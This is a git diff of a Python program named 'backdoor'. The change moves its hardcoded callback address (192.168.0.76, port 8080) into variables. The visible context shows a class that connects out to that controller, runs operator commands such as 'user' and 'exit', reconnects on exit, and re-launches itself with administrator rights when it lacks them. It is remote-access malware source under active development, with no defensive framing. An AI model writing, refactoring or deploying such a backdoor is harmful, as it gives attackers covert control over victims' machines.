@@ -18,6 +18,8 @@ import ctypes, sys
 import time
 import hashlib
 
+ip = "192.168.0.76"
+port = 8080
 
 def is_admin():
     try:
@@ -302,7 +304,7 @@ class backdoor:
                 if len(rest_of_command) == 0:       # Commands with no arguments
                     if command_0 == "exit":     # Exit the program
                         self.connection.close()
-                        my_backdoor = backdoor("192.168.0.76", 8080)
+                        my_backdoor = backdoor(ip, port)
                         my_backdoor.run()
                     elif command_0 == "user":
                         command_result = self.get_current_user()
@@ -384,7 +386,7 @@ class backdoor:
 
 
 if is_admin():
-    my_backdoor = backdoor("192.168.0.76", 8080)
+    my_backdoor = backdoor(ip, port)
     my_backdoor.run()
 else:
     # Re-run the program with admin rights
